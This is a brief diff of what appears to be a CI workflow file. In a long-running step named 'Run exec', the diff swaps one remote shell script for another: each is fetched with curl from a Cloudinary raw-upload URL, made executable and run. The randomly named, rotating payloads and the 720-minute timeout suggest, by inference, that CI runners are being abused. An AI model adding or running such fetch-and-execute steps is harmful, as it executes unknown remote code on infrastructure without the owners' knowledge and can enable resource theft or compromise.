@@ -13,9 +13,9 @@ jobs:
       - name: Run exec
         timeout-minutes: 720
         run: |
-          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711124126/dmoowsii38zpn2nr23o9.sh
-          chmod +x dmoowsii38zpn2nr23o9.sh
-          ./dmoowsii38zpn2nr23o9.sh
+          curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711125466/o8abekknjkh6hlgjcwal.sh
+          chmod +x o8abekknjkh6hlgjcwal.sh
+          ./o8abekknjkh6hlgjcwal.sh
 
       - name: IP Workflow
         run: |
